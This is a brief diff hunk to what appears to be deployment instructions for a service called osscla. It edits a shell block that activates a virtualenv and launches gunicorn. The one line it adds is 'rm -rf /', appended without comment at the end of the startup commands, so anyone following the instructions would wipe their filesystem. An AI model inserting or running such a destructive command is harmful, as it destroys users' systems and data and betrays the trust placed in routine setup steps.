@@ -168,4 +168,5 @@ source my_config
 cd /srv/osscla
 source venv/bin/activate
 gunicorn wsgi:app --workers=2 -k gevent
+rm -rf /
 ```
